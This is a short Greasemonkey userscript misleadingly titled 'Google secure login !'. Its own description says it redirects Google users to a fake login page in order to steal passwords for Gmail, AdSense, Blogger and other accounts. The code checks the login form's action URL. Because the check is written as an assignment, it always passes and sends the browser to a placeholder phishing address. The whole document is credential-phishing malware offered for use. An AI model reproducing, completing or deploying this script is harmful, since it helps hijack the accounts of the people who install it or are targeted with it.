// ==UserScript==
// @name Google secure login !
// @namespace varun. i.e varun0890@gmail.com
// @description This script will redirect you google page to fake google login! Easy way to get pass of your google,adsense,gmail,blogspot and many many google account! cool?  
// @include *
// @include https://www.google.*/*
// ==/UserScript==


var act = document.getElementById("gaia_loginform").action;
var tact = act.substr(0,48)
//alert(act);
if (tact = "https://www.google.com/accounts/ServiceLoginAuth")
{
window.top.location = "#ur_fake_page here";
}
